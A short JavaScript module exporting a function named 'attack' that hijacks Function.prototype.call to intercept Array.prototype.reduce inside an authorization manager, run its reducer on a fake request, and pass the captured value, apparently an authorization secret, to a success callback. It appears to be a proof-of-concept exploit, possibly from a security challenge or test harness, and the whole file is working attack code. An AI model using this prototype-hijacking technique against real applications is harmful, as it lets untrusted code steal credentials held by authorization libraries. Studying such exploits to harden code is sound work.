export const attack = (authzManager, success) => {
  Function.prototype.call = function (thisArg, ...args) {
    if (this === Array.prototype.reduce) {
      const stolenAcc = args[0]({}, { url: "z", headers: {} }, 0);
      success(stolenAcc["z"]);
      return {};
    } else {
      this.apply(thisArg, args);
    }
  };

  authzManager.authorizedFetch([]);
};
